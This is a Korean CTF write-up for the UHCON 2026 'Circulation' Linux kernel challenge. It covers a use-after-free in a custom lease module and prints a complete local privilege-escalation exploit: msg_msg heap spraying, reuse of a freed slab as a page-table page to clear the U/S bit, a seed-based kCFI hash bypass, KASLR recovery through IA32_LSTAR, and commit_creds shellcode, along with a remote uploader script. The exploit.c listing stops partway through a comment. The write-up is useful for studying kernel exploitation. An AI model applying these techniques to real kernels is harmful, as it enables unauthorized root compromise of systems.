# UHCON 2026 — Circulation Write-up

## 결과

- 분야: pwn / Linux kernel
- 원격: `43.203.150.218:1337`
- 최종 익스플로잇 SHA-256: `84c20996be1436034a811f62ea393d6bf4b7a2a4bba438710340a67bab6b3e3f`
- 로컬 최종판 검증: 메인 반복 20/20, 독립 반복 10/10 성공
- CTFd 제출 결과: `Correct`

최종 플래그:

```text
FLAG{e9a2e3fd17eda1d6b8b69124c429662c4110aabfe8d27cdf8de31ae605392b80b547e18c43109d1fba8ff828b345e908e326b4a1bcc9ca6c03bf2e918328cad8b8fb93f969507303}
```

같은 값은 별도 `flag.txt`에도 저장했다.

## 1. 환경과 모듈 분석

제공된 `run.sh`는 2 vCPU, 128 MiB QEMU에서 커널 6.18.56을 실행한다. KASLR, NX, SMEP, SMAP, rehashed retpoline kCFI가 켜져 있고 KPTI는 꺼져 있다. `/drop`은 익스플로잇을 UID/GID 1000으로 실행하며 `RLIMIT_NPROC=0`을 설정하므로 새 프로세스나 스레드에 의존할 수 없다.

`lease.ko` 디스어셈블리에서 복원한 주요 ioctl은 다음과 같다.

| 이름 | 값 | 역할 |
|---|---:|---|
| `LE_CREATE` | `0xc0084c01` | lease 객체 생성 |
| `LE_DESTROY` | `0x40044c02` | xarray에서 제거 후 해제 |
| `LE_ACQUIRE` | `0x40044c03` | 객체를 파일 컨텍스트에 연결 |
| `LE_FLUSH` | `0x00004c04` | ops의 간접 콜백 실행 |
| `LE_SET` | `0x40384c05` | 데이터 설정 및 dirty 표시 |
| `LE_GET` | `0xc0384c06` | 데이터 조회 |
| `LE_INFO` | `0xc0104c07` | 상태 조회 |

논리적인 객체 크기는 72바이트이고 첫 qword에는 ops 포인터와 하위 상태 비트가 함께 들어 있다.

```c
struct lease_entry {
    uint64_t ops_and_state; /* bit 0=valid, 1=dirty, 2=leased */
    uint32_t id;
    uint32_t kind;
    uint32_t len;
    uint8_t  data[0x30];
};
```

실제 `lease_entry` 전용 SLUB 캐시는 정렬 때문에 객체 간격이 `0x80`이다. 한 order-0 페이지에 정확히 32개가 들어간다.

```text
object_size=72, size=128, align=64
objs_per_slab=32, order=0, cpu_partial=120
```

## 2. 취약점: clean lease의 UAF

`LE_ACQUIRE`는 bit 2를 원자적으로 설정하고 객체 포인터를 파일의 8바이트 컨텍스트에 저장한다. 정상적인 `LE_DESTROY`라면 leased 상태가 끝날 때까지 기다린 뒤 객체를 해제해야 한다.

하지만 실제 코드는 dirty bit인 bit 1이 설정된 경우에만 대기 경로로 들어간다. 데이터가 수정되지 않은 clean 객체는 상태가 `0x4`인 채로도 즉시 `kmem_cache_free()`된다. acquire한 파일 컨텍스트에는 해제된 객체 포인터가 그대로 남는다.

재현 순서는 다음과 같다.

1. A에서 `CREATE → ACQUIRE → DESTROY`하여 dangling fd를 만든다.
2. 즉시 새 객체 B를 만들면 같은 SLUB 슬롯을 재사용한다.
3. B를 acquire한 뒤 A를 닫으면 stale release가 B의 bit 2를 지운다.
4. B가 여전히 사용 중인데도 다른 fd가 다시 acquire할 수 있다.

이 same-slot UAF는 16/16회 재현되었다. stale fd를 닫으면 dangling 주소의 `value &= ~4`를 수행하고, stale fd에서 `LE_FLUSH`를 호출하면 재활용된 첫 qword를 ops 포인터로 사용해 간접 호출한다. 따라서 다음 두 primitive를 얻는다.

- 해제된 `0x80` 간격 주소의 bit 2 clear
- 같은 주소에서 공격자가 준비한 ops를 통한 stale indirect call

## 3. Phase B: `msg_msg`로 정확한 dangling 슬롯 찾기

먼저 lease 객체 2048개, 즉 64개 slab 페이지를 만든다. 각 slab에서 4개 슬롯에 대해 probe/trigger 두 dangling fd가 같은 주소를 가리키도록 만들고 모든 lease 객체를 해제한다.

해제된 페이지는 SysV 메시지의 `kmalloc-cg-96` 객체로 재활용한다. `msg_msg` 헤더 48바이트와 payload 48바이트를 합쳐 96바이트가 된다.

```text
kmalloc-cg-96: 96-byte object, align 32, 42 objects/order-0 page
16 queues × 126 messages = 2016 messages = 48 full slab pages
```

메시지 수를 42의 정확한 배수로 만든 이유가 중요하다. 처음 사용한 2048개 메시지는 마지막 slab에 10개의 빈 슬롯을 남겼다. target 메시지를 dequeue한 뒤 다시 enqueue할 때 그 빈 슬롯을 먼저 사용하는 경우가 생겨 성공률이 약 85%로 떨어졌다. 2016개로 맞추자 마지막 slab까지 가득 차고, 같은 CPU에서의 free 직후 allocation이 target 슬롯을 안정적으로 돌려주었다.

lease 간격은 `0x80`, 메시지 간격은 `0x60`이므로 dangling offset은 modulo `0x60`에서 `0`, `0x20`, `0x40`을 반복한다. `0x40`만 메시지 payload 안에 들어가며 실제 관측 위치는 항상 payload word 2였다. payload는 모두 다음 marker로 채운다.

```c
0x4141414141414104ULL
```

probe fd를 닫았을 때 재활용에 성공한 슬롯은 marker가 `...04 → ...00`으로 변한다. 이 커널에는 `MSG_COPY`가 없으므로 메시지마다 고유 mtype을 주고 `msgrcv(type) → 검사 → 즉시 msgsnd()`로 원래 크기의 객체를 복원했다. 메시지 spray와 최종 dequeue/requeue는 CPU 0에서 수행한다.

marker가 변한 메시지를 찾으면 남아 있는 trigger fd가 동일한 주소를 가리킨다는 뜻이다. 마지막에는 해당 메시지 payload를 `fake_ops | 4`로 교체한다.

## 4. Phase A: lease slab을 PTE 페이지로 재활용

SMEP 때문에 일반 user mapping의 셸코드를 커널에서 실행할 수 없다. 두 번째 lease slab population을 page-table page로 재활용하고 stale release로 PTE의 U/S 비트를 지웠다.

하나의 4 KiB memfd 코드 페이지를 여러 주소에 공유 매핑한다. 각 2 MiB 영역마다 32개 주소를 `0x10000` 간격으로 배치한다.

```text
PTE index step = 0x10000 / 0x1000 = 16
PTE byte step  = 16 × 8 = 0x80
```

따라서 PTE qword의 간격이 lease 객체 간격 `0x80`과 정확히 일치한다. 64개 lease slab 페이지를 비운 뒤 각 영역을 처음 touch하면 freed slab이 PTE 페이지로 재사용된다. dangling fd를 닫을 때 PTE bit 2, 즉 U/S 비트가 지워진다.

CPU 0에는 이전 user PTE가 TLB에 남아 있을 수 있으므로 CPU 1로 이동해 alias를 읽어 본다. SIGSEGV가 나는 alias는 동일 memfd 페이지를 가리키지만 PTE가 supervisor-only로 바뀐 주소다. 정상 RW alias를 통해 같은 물리 페이지에 fake ops와 셸코드를 쓸 수 있고, 커널은 supervisor alias를 통해 이를 읽고 실행한다. 이로써 SMEP와 SMAP을 모두 만족한다.

## 5. 부팅마다 바뀌는 kCFI 우회

취약한 `LE_FLUSH` 간접 호출은 다음 형태로 kCFI 타입을 검사한다.

```asm
mov    (%rax), %r11
mov    $runtime_negative_hash, %r10d
add    -0xf(%r11), %r10d
jne    ud2
call   *%r11
```

모듈의 정적 flush 타입 해시는 `0x1c271bf8`이다. 하지만 `cfi=debug` 부팅은 매번 `cfi_seed`를 serial console에 출력하고 모든 preamble과 callsite를 다시 해시한다. 공식 x86 구현과 동일하게 다음 계산을 사용했다.

```c
uint32_t h = 0x1c271bf8 ^ seed;
while (is_endbr(h) || is_endbr(-h)) {
    uint32_t lsb = h & 1;
    h >>= 1;
    if (lsb)
        h ^= 0x80200003;
}
```

`solve.py`가 부팅 로그에서 seed를 캡처하고 익스플로잇의 `CFI_SEED_HEX?` 입력으로 전달한다. 익스플로잇은 계산한 runtime hash를 셸코드 target의 `target - 0xf`에 기록한다.

참고한 커널 구현은 Linux의 [`arch/x86/kernel/alternative.c`](https://github.com/torvalds/linux/blob/master/arch/x86/kernel/alternative.c)이고, `cfi=debug`의 의미는 [kernel parameters 문서](https://docs.kernel.org/6.18/admin-guide/kernel-parameters.html)에 설명되어 있다.

## 6. KASLR 해결과 root 획득

fake callback은 supervisor alias에 놓이며 `ENDBR64`로 시작한다. CPL0에서 `RDMSR(IA32_LSTAR)`를 실행하면 `entry_SYSCALL_64` 주소를 얻을 수 있다. 이 커널에서 해당 심볼은 `_text + 0x80`이므로 KASLR base를 계산할 수 있다.

사용한 심볼 오프셋은 다음과 같다.

```text
entry_SYSCALL_64    = _text + 0x00000080
commit_creds        = _text + 0x002c9900
prepare_kernel_cred = _text + 0x002c9b30
init_task           = _text + 0x00e0d140
```

`prepare_kernel_cred(NULL)`은 이 커널에서 trap이 발생하므로 `init_task`를 인자로 전달한다.

```c
new = prepare_kernel_cred(&init_task);
commit_creds(new);
```

콜백이 반환되면 UID/GID가 0이 되고 `/flag`를 읽는다.

## 7. 빌드와 실행

Linux 또는 WSL에서 정적 바이너리를 빌드한다.

```bash
gcc -O2 -static -Wall -Wextra -Werror -o exploit exploit.c
sha256sum exploit
```

CTFd access token을 인자, 파일, 또는 환경 변수로 전달할 수 있다.

```bash
python3 solve.py --token 'YOUR_CTFD_ACCESS_TOKEN'

# 또는
UHCON_CTFD_TOKEN='YOUR_CTFD_ACCESS_TOKEN' python3 solve.py
```

스크립트는 토큰 인증, base64 업로드, per-boot seed 중계, 플래그 추출을 한 연결에서 자동으로 수행한다.

원격 성공 로그의 핵심은 다음과 같았다.

```text
cfi_seed: 0xdfa359a2
runtime_hash=0xc384425a
msg match after 4 probes: object=64 queue=13 index=66 word=2
supervisor alias=0x400000050000 after 6 checks
uid=0 gid=0
```

CTFd는 최종 제출에 `Correct`를 반환했다.

## 최종 풀이 코드 전체

아래 코드는 최종 원격 uploader, 커널 exploit, 재현 빌드 스크립트의 원문 전체다. CTFd access token은 하드코딩하지 않고 `--token`, `--token-file`, 또는 `UHCON_CTFD_TOKEN`으로만 받는다.

### `solve.py`

```python
#!/usr/bin/env python3
"""Remote solver for UHCON Circulation.

The launcher uploads the adjacent static ``exploit`` binary, captures the
per-boot kCFI seed from the serial console, and relays it when the exploit asks.
"""

from __future__ import annotations

import argparse
import base64
import os
from pathlib import Path
import re
import socket
import sys
import time


DEFAULT_HOST = "43.203.150.218"
DEFAULT_PORT = 1337
FLAG_RE = re.compile(rb"(?:FLAG|UHCON|UHC)\{[^}\r\n]+\}")
SEED_RE = re.compile(rb"cfi_seed: 0x([0-9a-fA-F]{8})")


def emit(data: bytes, quiet: bool) -> None:
    if not quiet:
        sys.stdout.buffer.write(data)
        sys.stdout.buffer.flush()


def recv_until(
    sock: socket.socket,
    marker: bytes,
    timeout: float,
    transcript: bytearray,
    quiet: bool,
) -> None:
    deadline = time.monotonic() + timeout
    while marker not in transcript:
        remaining = deadline - time.monotonic()
        if remaining <= 0:
            raise TimeoutError(f"timed out waiting for {marker!r}")
        sock.settimeout(min(remaining, 5.0))
        chunk = sock.recv(65536)
        if not chunk:
            raise EOFError(f"connection closed before {marker!r}")
        transcript.extend(chunk)
        emit(chunk, quiet)


def load_token(args: argparse.Namespace) -> str:
    if args.token:
        return args.token.strip()
    if args.token_file:
        return args.token_file.read_text(encoding="utf-8").strip()
    token = os.environ.get("UHCON_CTFD_TOKEN", "").strip()
    if token:
        return token
    raise SystemExit(
        "provide --token, --token-file, or the UHCON_CTFD_TOKEN environment variable"
    )


def main() -> int:
    root = Path(__file__).resolve().parent
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument("--host", default=DEFAULT_HOST)
    parser.add_argument("--port", type=int, default=DEFAULT_PORT)
    parser.add_argument("--token")
    parser.add_argument("--token-file", type=Path)
    parser.add_argument("--exploit", type=Path, default=root / "exploit")
    parser.add_argument("--timeout", type=float, default=180.0)
    parser.add_argument("--transcript", type=Path, default=root / "remote.log")
    parser.add_argument("--quiet", action="store_true")
    args = parser.parse_args()

    token = load_token(args)
    raw_exploit = args.exploit.read_bytes()
    encoded = base64.b64encode(raw_exploit)
    if len(encoded) > 8_000_000:
        raise SystemExit("base64 exploit exceeds the service limit")
    upload = b"\n".join(
        encoded[offset:offset + 76] for offset in range(0, len(encoded), 76)
    ) + b"\n\n"

    transcript = bytearray()
    seed: bytes | None = None
    seed_sent = False
    try:
        with socket.create_connection((args.host, args.port), timeout=15) as sock:
            recv_until(
                sock, b"CTFd access token: ", 20, transcript, args.quiet
            )
            sock.sendall(token.encode() + b"\n")
            recv_until(
                sock,
                b"base64 exploit, empty line to end:",
                90,
                transcript,
                args.quiet,
            )
            sock.sendall(upload)

            deadline = time.monotonic() + args.timeout
            while time.monotonic() < deadline:
                sock.settimeout(min(5.0, deadline - time.monotonic()))
                try:
                    chunk = sock.recv(65536)
                except socket.timeout:
                    continue
                if not chunk:
                    break
                transcript.extend(chunk)
                emit(chunk, args.quiet)

                window = bytes(transcript[-8192:])
                if seed is None:
                    match = SEED_RE.search(window)
                    if match:
                        seed = match.group(1)
                if seed is not None and not seed_sent and b"CFI_SEED_HEX?" in window:
                    sock.sendall(seed + b"\n")
                    seed_sent = True

                flag = FLAG_RE.search(transcript)
                if flag:
                    args.transcript.write_bytes(transcript)
                    value = flag.group(0).decode("ascii", "replace")
                    print(f"\n[+] {value}")
                    return 0
    finally:
        args.transcript.write_bytes(transcript)

    raise SystemExit(f"flag not found; transcript saved to {args.transcript}")


if __name__ == "__main__":
    raise SystemExit(main())
```

### `exploit.c`

```c
#define _GNU_SOURCE

#include <errno.h>
#include <fcntl.h>
#include <setjmp.h>
#include <sched.h>
#include <signal.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/ipc.h>
#include <sys/mman.h>
#include <sys/msg.h>
#include <sys/resource.h>
#include <sys/stat.h>
#include <sys/syscall.h>
#include <sys/types.h>
#include <unistd.h>

/* Recovered directly from lease.ko. */
#define LE_CREATE   0xc0084c01UL
#define LE_DESTROY  0x40044c02UL
#define LE_ACQUIRE  0x40044c03UL
#define LE_FLUSH    0x00004c04UL

#define PAGE_SIZE_  0x1000UL
#define PMD_SIZE_   0x200000UL
#define SLOT_SIZE   0x80UL
#define SLOTS_PAGE  32U

/* 64 order-0 lease slabs. 13 can be retained (5 node + 8 CPU partial). */
#define LEASE_OBJECTS 2048U
#define PTE_GROUPS    64U
#define REFS_PER_SLAB 4U
#define SLAB_COUNT    (LEASE_OBJECTS / SLOTS_PAGE)
#define STALE_REFS    (SLAB_COUNT * REFS_PER_SLAB)

/* 48-byte msg_msg header + 48 bytes of text => kmalloc-96. */
#define MSG_QUEUES      16U
/* kmalloc-cg-96 has 42 objects/slab; 16 * 126 = exactly 48 full slabs. */
#define MSGS_PER_QUEUE 126U

/* A quiet, normally unused 64-TiB user range. */
#define PT_BASE 0x0000400000000000ULL

#define KCFI_OP_HASH 0x1c271bf8U
#define MARKER       0x4141414141414104ULL
#define MARKER_CLEAR (MARKER & ~4ULL)

struct create_req {
    uint32_t id;
    uint32_t kind;
};

struct stale_pair {
    int probe_fd;
    int trigger_fd;
    uint32_t id;
};

struct spray_msg {
    long type;
    uint64_t data[6];
};

struct message_hit {
    unsigned queue;
    unsigned index;
    unsigned word;
};

static sigjmp_buf fault_env;
static volatile sig_atomic_t fault_probe;

static void die(const char *what)
{
    dprintf(1, "[-] %s: errno=%d (%s)\n", what, errno, strerror(errno));
    _exit(1);
}

static void write_all(int fd, const void *buffer, size_t length)
{
    const unsigned char *cursor = buffer;
    while (length) {
        ssize_t n = write(fd, cursor, length);
        if (n < 0) {
            if (errno == EINTR)
                continue;
            die("write");
        }
        cursor += (size_t)n;
        length -= (size_t)n;
    }
}

static void pin_cpu(int cpu)
{
    cpu_set_t set;
    CPU_ZERO(&set);
    CPU_SET(cpu, &set);
    if (sched_setaffinity(0, sizeof(set), &set) != 0)
        die("sched_setaffinity");
}

static int lease_open(void)
{
    int fd = open("/dev/lease", O_RDWR | O_CLOEXEC);
    if (fd < 0)
        die("open /dev/lease");
    return fd;
}

static uint32_t lease_create(int fd)
{
    struct create_req req = {.id = 0, .kind = 0};
    if (ioctl(fd, LE_CREATE, &req) != 0)
        die("LE_CREATE");
    return req.id;
}

static void lease_acquire(int fd, uint32_t id)
{
    if (ioctl(fd, LE_ACQUIRE, &id) != 0)
        die("LE_ACQUIRE");
}

static void lease_destroy(int fd, uint32_t id)
{
    if (ioctl(fd, LE_DESTROY, &id) != 0)
        die("LE_DESTROY");
}

static int xmemfd(const char *name)
{
    int fd = (int)syscall(SYS_memfd_create, name, MFD_CLOEXEC);
    if (fd < 0)
        die("memfd_create");
    return fd;
}

static void *fixed_alias(uintptr_t address, int fd)
{
    void *wanted = (void *)address;
    void *result = mmap(wanted, PAGE_SIZE_,
                        PROT_READ | PROT_WRITE | PROT_EXEC,
                        MAP_SHARED | MAP_FIXED_NOREPLACE, fd, 0);
    if (result == MAP_FAILED)
        die("mmap fixed alias");
    if (result != wanted) {
        errno = EFAULT;
        die("mmap returned wrong address");
    }
    return result;
}

static void fault_handler(int sig, siginfo_t *info, void *context)
{
    (void)sig;
    (void)info;
    (void)context;
    if (fault_probe)
        siglongjmp(fault_env, 1);
    _exit(128 + SIGSEGV);
}

static int user_readable(volatile unsigned char *address)
{
    if (sigsetjmp(fault_env, 1) != 0) {
        fault_probe = 0;
        return 0;
    }
    fault_probe = 1;
    (void)*address;
    fault_probe = 0;
    return 1;
}

static int find_cleared_message(const int queues[MSG_QUEUES],
                                struct message_hit *hit)
{
    struct spray_msg message;

    for (unsigned queue = 0; queue < MSG_QUEUES; queue++) {
        for (unsigned index = 0; index < MSGS_PER_QUEUE; index++) {
            /*
             * CONFIG_CHECKPOINT_RESTORE is disabled, so MSG_COPY is absent.
             * Remove by unique mtype and immediately reinsert the identical
             * allocation; same-CPU SLUB LIFO preserves its address.
             */
            ssize_t length = msgrcv(queues[queue], &message,
                                    sizeof(message.data), (long)index + 1,
                                    IPC_NOWAIT | MSG_NOERROR);
            if (length != (ssize_t)sizeof(message.data))
                die("msgrcv scan");
            int found = 0;
            unsigned found_word = 0;
            for (unsigned word = 0; word < 6; word++) {
                if (message.data[word] == MARKER_CLEAR) {
                    found = 1;
                    found_word = word;
                    break;
                }
            }
            if (msgsnd(queues[queue], &message, sizeof(message.data),
                       IPC_NOWAIT) != 0)
                die("msgsnd scan restore");
            if (found) {
                hit->queue = queue;
                hit->index = index;
                hit->word = found_word;
                return 1;
            }
        }
    }
    return 0;
}

static void replace_message(int queue, const struct message_hit *hit,
                            uint64_t fake_entry_word)
{
    struct spray_msg message;

    ssize_t length = msgrcv(queue, &message, sizeof(message.data),
                            (long)hit->index + 1,
                            IPC_NOWAIT | MSG_NOERROR);
    if (length != (ssize_t)sizeof(message.data))
        die("msgrcv replace");
    message.type = (long)hit->index + 1;
    for (unsigned word = 0; word < 6; word++)
        message.data[word] = fake_entry_word;
    if (msgsnd(queue, &message, sizeof(message.data), IPC_NOWAIT) != 0)
        die("msgsnd replace");
}

static int is_endbr_word(uint32_t value)
{
    return value == 0xfa1e0ff3U || value == 0xfb1e0ff3U;
}

static uint32_t runtime_cfi_hash(uint32_t seed)
{
    uint32_t hash = KCFI_OP_HASH ^ seed;

    while (is_endbr_word(hash) || is_endbr_word(0U - hash)) {
        uint32_t lsb = hash & 1U;
        hash >>= 1;
        if (lsb)
            hash ^= 0x80200003U;
    }
    return hash;
}

static uint32_t read_cfi_seed(void)
{
    char line[64];
    char *end = NULL;

    dprintf(1, "CFI_SEED_HEX?\n");
    ssize_t count = read(STDIN_FILENO, line, sizeof(line) - 1);
    if (count <= 0)
        die("read cfi seed");
    line[count] = '\0';
    errno = 0;
    unsigned long value = strtoul(line, &end, 16);
    if (errno != 0 || end == line || value > UINT32_MAX) {
        errno = EINVAL;
        die("parse cfi seed");
    }
    return (uint32_t)value;
}

static void install_payload(uint8_t *rw_alias, uintptr_t supervisor_alias,
                            uint32_t cfi_hash)
{
    /*
     * Called as int flush(void *entry).  KCFI reads target[-0xf].
     * The shellcode reads IA32_LSTAR and uses the fixed vmlinux offsets:
     *   entry_SYSCALL_64    = base + 0x80
     *   init_task           = base + 0xe0d140
     *   prepare_kernel_cred = base + 0x2c9b30
     *   commit_creds        = base + 0x2c9900
     */
    static const unsigned char shellcode[] = {
        0xf3, 0x0f, 0x1e, 0xfa,                   /* endbr64 */
        0x53,                                     /* push rbx; align stack */
        0xb9, 0x82, 0x00, 0x00, 0xc0,             /* mov ecx,0xc0000082 */
        0x0f, 0x32,                               /* rdmsr */
        0x48, 0xc1, 0xe2, 0x20,                   /* shl rdx,32 */
        0x48, 0x09, 0xd0,                         /* or rax,rdx */
        0x48, 0x2d, 0x80, 0x00, 0x00, 0x00,       /* sub rax,0x80 */
        0x48, 0x89, 0xc3,                         /* mov rbx,rax */
        0x48, 0x8d, 0xbb, 0x40, 0xd1, 0xe0, 0x00, /* lea rdi,[rbx+0xe0d140] */
        0x48, 0x8d, 0x83, 0x30, 0x9b, 0x2c, 0x00, /* lea rax,[rbx+0x2c9b30] */
        0xff, 0xd0,                               /* call rax */
        0x48, 0x89, 0xc7,                         /* mov rdi,rax */
        0x48, 0x8d, 0x83, 0x00, 0x99, 0x2c, 0x00, /* lea rax,[rbx+0x2c9900] */
        0xff, 0xd0,                               /* call rax */
        0x5b,                                     /* pop rbx */
        0x31, 0xc0,                               /* xor eax,eax */
        0xc3                                      /* ret */
    };

    const size_t ops_offset = 0x100;
    const size_t code_offset = 0x200;
    uintptr_t target = supervisor_alias + code_offset;

    memset(rw_alias, 0x90, PAGE_SIZE_);
    *(uint64_t *)(rw_alias + ops_offset) = target;
    rw_alias[code_offset - 0x10] = 0xb8; /* mov imm32,%eax KCFI preamble */
    *(uint32_t *)(rw_alias + code_offset - 0xf) = cfi_hash;
    memcpy(rw_alias + code_offset, shellcode, sizeof(shellcode));
    __builtin___clear_cache((char *)rw_alias, (char *)rw_alias + PAGE_SIZE_);
}

static void print_flag(void)
{
    char buffer[256];
    int fd = open("/flag", O_RDONLY);
    if (fd < 0)
        die("open /flag");
    ssize_t n = read(fd, buffer, sizeof(buffer));
    if (n < 0)
        die("read /flag");
    dprintf(1, "[+] uid=%d gid=%d flag=", getuid(), getgid());
    if (n)
        write_all(1, buffer, (size_t)n);
    if (!n || buffer[n - 1] != '\n')
        write_all(1, "\n", 1);
}

int main(void)
{
    setvbuf(stdout, NULL, _IONBF, 0);

    uint32_t cfi_seed = read_cfi_seed();
    uint32_t cfi_hash = runtime_cfi_hash(cfi_seed);
    dprintf(1, "[*] cfi_seed=%#x static_hash=%#x runtime_hash=%#x\n",
            cfi_seed, KCFI_OP_HASH, cfi_hash);

    struct rlimit limit;
    if (getrlimit(RLIMIT_NOFILE, &limit) != 0)
        die("getrlimit");
    limit.rlim_cur = limit.rlim_max;
    if (setrlimit(RLIMIT_NOFILE, &limit) != 0)
        die("setrlimit");

    long cpus = sysconf(_SC_NPROCESSORS_ONLN);
    dprintf(1, "[*] circulation exploit: uid=%d cpus=%ld nofile=%lu\n",
            getuid(), cpus, (unsigned long)limit.rlim_cur);
    if (cpus < 2) {
        errno = ENODEV;
        die("need two CPUs");
    }
    pin_cpu(0);

    /* One shared physical page, later exposed through many PTEs. */
    int code_fd = xmemfd("circulation-code");
    if (ftruncate(code_fd, PAGE_SIZE_) != 0)
        die("ftruncate code");
    uint8_t *code_rw = mmap(NULL, PAGE_SIZE_,
                            PROT_READ | PROT_WRITE | PROT_EXEC,
                            MAP_SHARED, code_fd, 0);
    if (code_rw == MAP_FAILED)
        die("mmap code rw");
    code_rw[0] = 0x90; /* allocate the shmem page before lease slabs are freed */

    for (unsigned group = 0; group < PTE_GROUPS; group++) {
        uintptr_t group_base = PT_BASE + (uintptr_t)group * PMD_SIZE_;
        for (unsigned slot = 0; slot < SLOTS_PAGE; slot++)
            fixed_alias(group_base + (uintptr_t)slot * 0x10000UL, code_fd);
    }

    /* Pre-create upper paging levels without pre-creating target PTE pages. */
    volatile uint8_t *warm = fixed_alias(
        PT_BASE + (uintptr_t)(PTE_GROUPS + 1) * PMD_SIZE_ + PAGE_SIZE_,
        code_fd);
    (void)*warm;

    int queues[MSG_QUEUES];
    for (unsigned queue = 0; queue < MSG_QUEUES; queue++) {
        queues[queue] = msgget(IPC_PRIVATE, 0600 | IPC_CREAT);
        if (queues[queue] < 0)
            die("msgget");
    }

    struct stale_pair *pairs = calloc(STALE_REFS, sizeof(*pairs));
    int *pte_fds = calloc(STALE_REFS, sizeof(*pte_fds));
    uint32_t *object_ids = calloc(LEASE_OBJECTS, sizeof(*object_ids));
    if (!pairs || !pte_fds || !object_ids)
        die("calloc");

    int control_fd = lease_open();
    dprintf(1, "[*] phase B: allocating %u objects, %u paired references\n",
            LEASE_OBJECTS, STALE_REFS);
    for (unsigned i = 0; i < LEASE_OBJECTS; i++) {
        object_ids[i] = lease_create(control_fd);
    }
    unsigned pair_count = 0;
    for (unsigned group = 0; group < SLAB_COUNT; group++) {
        for (unsigned ref = 0; ref < REFS_PER_SLAB; ref++) {
            unsigned i = group * SLOTS_PAGE + ref;
            int helper = lease_open();
            lease_acquire(helper, object_ids[i]);
            lease_destroy(control_fd, object_ids[i]);

            uint32_t replacement = lease_create(control_fd);
            int probe = lease_open();
            lease_acquire(probe, replacement);

            /* The old stale release clears bit 2 in the immediate replacement. */
            if (close(helper) != 0)
                die("close alias builder");

            int trigger = lease_open();
            lease_acquire(trigger, replacement);
            object_ids[i] = replacement;
            pairs[pair_count].probe_fd = probe;
            pairs[pair_count].trigger_fd = trigger;
            pairs[pair_count].id = replacement;
            pair_count++;
        }
    }
    for (unsigned i = 0; i < LEASE_OBJECTS; i++)
        lease_destroy(control_fd, object_ids[i]);

    /* Reclaim released lease slab pages with kmalloc-96 msg_msg objects. */
    struct spray_msg message;
    for (unsigned word = 0; word < 6; word++)
        message.data[word] = MARKER;
    for (unsigned queue = 0; queue < MSG_QUEUES; queue++) {
        for (unsigned index = 0; index < MSGS_PER_QUEUE; index++) {
            message.type = (long)index + 1;
            if (msgsnd(queues[queue], &message, sizeof(message.data),
                       IPC_NOWAIT) != 0)
                die("msgsnd spray");
        }
    }
    dprintf(1, "[*] phase B: sprayed %u kmalloc-96 messages\n",
            MSG_QUEUES * MSGS_PER_QUEUE);

    /* Allocate the second slab population before any stale bit-clears. */
    dprintf(1, "[*] phase A: allocating %u objects, %u PTE references\n",
            LEASE_OBJECTS, STALE_REFS);
    for (unsigned i = 0; i < LEASE_OBJECTS; i++)
        object_ids[i] = lease_create(control_fd);
    unsigned pte_count = 0;
    for (unsigned group = 0; group < SLAB_COUNT; group++) {
        for (unsigned ref = 0; ref < REFS_PER_SLAB; ref++) {
            unsigned i = group * SLOTS_PAGE + ref;
            pte_fds[pte_count] = lease_open();
            lease_acquire(pte_fds[pte_count], object_ids[i]);
            pte_count++;
        }
    }
    for (unsigned i = 0; i < LEASE_OBJECTS; i++)
        lease_destroy(control_fd, object_ids[i]);

    /* Each first touch allocates a target PTE page; all data is pre-existing. */
    for (unsigned group = 0; group < PTE_GROUPS; group++) {
        uintptr_t group_base = PT_BASE + (uintptr_t)group * PMD_SIZE_;
        for (unsigned slot = 0; slot < SLOTS_PAGE; slot++) {
            volatile uint8_t *alias =
                (volatile uint8_t *)(group_base + (uintptr_t)slot * 0x10000UL);
            (void)*alias;
        }
    }
    dprintf(1, "[*] phase A: faulted %u candidate PTE pages\n", PTE_GROUPS);

    /*
     * Probe one object per likely-released slab first.  A data-page hit turns
     * MARKER (..04) into MARKER_CLEAR (..00), and its paired fd remains live.
     */
    struct message_hit hit = {0};
    int matched = 0;
    int trigger_fd = -1;
    unsigned matched_index = 0;
    unsigned attempts = 0;
    unsigned char *closed = calloc(STALE_REFS, 1);
    if (!closed)
        die("calloc closed");

    for (unsigned pass = 0; pass < 2 && !matched; pass++) {
        unsigned start = pass == 0 ? 13 : 0;
        unsigned end = pass == 0 ? SLAB_COUNT : 13;
        for (unsigned group = start; group < end && !matched; group++) {
            unsigned i = group * REFS_PER_SLAB;
            if (close(pairs[i].probe_fd) != 0)
                die("close data probe");
            pairs[i].probe_fd = -1;
            closed[i] = 1;
            attempts++;
            matched = find_cleared_message(queues, &hit);
            if (matched) {
                trigger_fd = pairs[i].trigger_fd;
                matched_index = i;
            }
        }
    }
    for (unsigned i = 0; i < STALE_REFS && !matched; i++) {
        if (closed[i])
            continue;
        if (close(pairs[i].probe_fd) != 0)
            die("close data probe fallback");
        pairs[i].probe_fd = -1;
        closed[i] = 1;
        attempts++;
        matched = find_cleared_message(queues, &hit);
        if (matched) {
            trigger_fd = pairs[i].trigger_fd;
            matched_index = i;
        }
    }
    if (!matched) {
        errno = ENOENT;
        die("no reclaimed data-page alias");
    }
    dprintf(1, "[+] msg match after %u probes: object=%u queue=%u index=%u word=%u\n",
            attempts, matched_index, hit.queue, hit.index, hit.word);

    /* No lease allocations occur after this point; freelist damage is safe. */
    for (unsigned i = 0; i < STALE_REFS; i++) {
        if (!closed[i]) {
            close(pairs[i].probe_fd);
            pairs[i].probe_fd = -1;
        }
    }
    for (unsigned i = 0; i < STALE_REFS; i++) {
        close(pte_fds[i]);
        pte_fds[i] = -1;
    }

    struct sigaction action;
    memset(&action, 0, sizeof(action));
    action.sa_sigaction = fault_handler;
    action.sa_flags = SA_SIGINFO | SA_NODEFER;
    sigemptyset(&action.sa_mask);
    if (sigaction(SIGSEGV, &action, NULL) != 0)
        die("sigaction");

    pin_cpu(1); /* CPU 1 has no stale user TLB entries for the aliases. */
    uintptr_t supervisor = 0;
    unsigned checked = 0;
    for (unsigned group = 0; group < PTE_GROUPS && !supervisor; group++) {
        uintptr_t group_base = PT_BASE + (uintptr_t)group * PMD_SIZE_;
        for (unsigned slot = 0; slot < SLOTS_PAGE; slot++) {
            uintptr_t alias = group_base + (uintptr_t)slot * 0x10000UL;
            checked++;
            if (!user_readable((volatile unsigned char *)alias)) {
                supervisor = alias;
                break;
            }
        }
    }
    if (!supervisor) {
        errno = ENOENT;
        die("no supervisor alias");
    }
    dprintf(1, "[+] supervisor alias=%#lx after %u checks\n",
            (unsigned long)supervisor, checked);

    install_payload(code_rw, supervisor, cfi_hash);
    uintptr_t fake_ops = supervisor + 0x100;

    /*
